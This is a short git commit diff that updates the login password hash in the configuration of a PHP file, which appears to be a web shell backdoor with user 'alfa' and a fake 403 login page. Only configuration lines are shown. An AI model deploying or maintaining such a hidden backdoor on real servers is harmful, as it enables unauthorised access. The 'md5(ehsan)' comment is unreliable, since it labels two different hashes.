6caedb87688dad90d1585d1098c3bf23ded6882d
aqilogic <153355849+aqilogic@users.noreply.github.com>
2026-03-24 13:15:23 +0700

    Update IDontKnow.php

--- IDontKnow.php
+++ IDontKnow.php
@@ -8,7 +8,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => '36ff79d8305336e248b3fcb0ae424aef',//md5(ehsan)
+    'password' => '666a5a793aadc052e8ca6ea8ec28215b',//md5(ehsan)
     'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
